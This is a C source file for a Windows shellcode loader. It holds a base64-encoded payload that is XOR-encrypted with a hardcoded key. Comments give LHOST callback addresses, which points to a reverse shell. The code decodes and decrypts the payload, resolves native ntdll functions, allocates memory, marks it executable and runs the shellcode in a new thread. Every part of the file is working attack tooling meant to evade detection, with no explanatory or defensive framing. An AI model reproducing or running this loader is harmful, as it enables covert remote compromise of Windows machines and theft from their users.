#pragma once
#pragma comment(lib,"ntdll.lib")

#include <Windows.h>
#include "structs.h"
#include "base64.h"
#include <stdio.h>


typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
	);


PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

int main(int argc, char* argv[]) {
	NTSTATUS status = 0x00000000;
	PVOID localSectionAddress = NULL;
	PVOID remoteSectionAddress = NULL;

//  LHOST=192.168.1.166
//	char shellcode[708] = "";
//	char* encoded = "rz3zgYK7/2NyMzVwEiUiLUOBViv5YRRwG/4ifTrYYUMkfkXoG3rHLzgbuBEie0Xh/0kRGXB/EyKz+nlgUrSSiCASYiv5YVSqEUk4ZKI1shtqOHYu1gdwZXLYs+tyM3Rp1rUEAjpS4yf5c1RoUqX7LWoD0DU6zL1g2EH4KEOae2Kke0Xh/zSxrH8SMqJK0wHQH3Y8QXoWCrIH6yxl2DVULHODVSL5Pzxl2DVsLHODcuh2uzV5G3SgJCoNajkzazV4Ei845p5zcjGN0yxgCi847mC6eJyNzClpYq4jLMwkWg0bXRFVUzQmLfuyeqSwfwMHVIqlNiEbuoIhaTkQkzhBrCEAetlIZQ2GU3VwZY2G221yM3QQakdeVERrHVJcAkIXUy847LMa9KPJMnQhHkS5NiE5MDA7iSOozLNwZXJTzLaaqXQhU1o4FjUiaw0BYgx4HwMzSEYZWQA5RjZgYjAmDRsMCztEcS1PAUM5VQg+WTEdVDVGYxkxIzthejYTfRlbORYhBh8jbCw6BBlJNhwhPB0wVlcwVztmAjEFHRlgAFA8ciR3GyVFARgrQQIRfVlHHS8+AzhreBoVdDgYagAaKx4LSxozRS4ZHTk4HSsyWilGZUdZMhE1XT08AAgLbHRp2rQjPzMLflK7YDyZU0fY4XJTM2MiYCdolLebMFxozLY6urJLWSo47IM5LDkgW/QSU3U57JI5NyIres5UFev2ZXJTM5ynfkXhAC847IMeAqo/Ar1yADy3p19VKxiN5vHhJmo4orPbIGNyes5lo0CQZXJTM5yne4vuJ3ebz5oGM2NyYC1LEy857KOS0XM79LQhQ3VwLMgLlzCXM3QhU4qlLeEAYCv71Dyooj35vzuU82NSM3Ro2ow532DFuoFyM3QhrKA45rZztqMGgRKqVD1xpveTRrEq8CxLUyzLhW95OSL76Yv0AA==";

//  LHOST=10.10.0.5
	char shellcode[590] = "";
	char* encoded = "rz3zgYK7/2NyMzVwEiUiLUOBYjUXe/9zMz37N2obuDFSfkXoG3rHLzgbuBEie0Xh/0kRGXB/EyKz+nlgUrSSiCASYiv5YVSqEUk4ZKI1shtqOHYu1gdwZXLYs+tyM3Rp1rUEAjpS4yf5c1Rx2D1oLHOD0DU/Ar1prLwx7kbbe2Kke0Xh/zSxrH8SMqJK0wHQH3Y8QXoWCrIH6yxl2DVULHODVSL5Pzxl2DVsLHODcuh2uzV5Ei0uPDpS4zkzazV4Ei845p5zcjGN0yxgCi847mC6eJyNzClpYq4jLMwkWg0bXRFVUzQmLfuyeqSwfwMHVIqlNiEbuoIhaTkQkzhBrCEAetlIZQ2GU3VwZY2G22lyM3QQY1tBVVxjHVZyaTyokjy3pclSM2M/Ar1yAB9zNjvpZOrt9XQhU3WPsJp6M2NyHBNMIDg+LDUWWFdHbAN5ZDE4MRYDQyIfHjlbHxYWVBU5XiIFVSBEOHU47LMAaSIqfkXoAD3IZUD7t2NyM3RxACY5orC4Zk1JzKFp2rMaby0bupIYLC5zO/VDZXIauoMYNzV4Gs8FI+zVM2NyM4v0HkSwNigbupI/Ar1sYrwjNjuU8U50Kw/ehvCwEG0b9KL6IHQhGs80lUezM2NyM4v0G4q/EXC4mYsnM3QhACwaJSgaurKz0WRolLVwdXJTetkqlyfEU3VwZY2Ge/AhYDyotD35lDra6Sq183QBU3U57IsaiXHkupYhU3VwmqcbsKdStrRV4RP7YjpS8OayRqZ5kC0aZSsa9KGChtZ3rKBk";
	//unsigned char encrypted[]="";

	printf("[+] Decoding b64 payload...\n");
	int result = Base64decode((char*)shellcode, encoded);
	
	/*
	for (int i = 0; i < sizeof(shellcode); i++) {
		printf("\\x%02x", shellcode[i] & 0xff);
	}
	*/
	

	printf("[+] Decrypting shellcode...\n");
	unsigned char key[] = "SuperS3cr3t!";
	for (int i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % (sizeof(key) - 1)];
		//printf("\\x%02x", shellcode[i] & 0xff);

	}

	FARPROC NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtAllocateVirtualMemory");
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtCreateThreadEx");
	FARPROC NtProtectVirtualMemory = GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtProtectVirtualMemory");
	GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtWaitForSingleObject");

	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	printf("[+] Allocating memory...\n");
	status = NtAllocateVirtualMemory((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
	printf("[+] Injecting the shellcode...\n");
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	ULONG ulOldProtect = 0;
	printf("[+] Setting RX permissions to allocated memory...\n");
	status = NtProtectVirtualMemory((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	HANDLE hHostThread = INVALID_HANDLE_VALUE; 
	printf("[+] Executing shellcode as a new thread...\n");
	status = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	LARGE_INTEGER Timeout;
	//Timeout.QuadPart = -100000000;
	Timeout.QuadPart = 9223372036854775807;
	NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
}
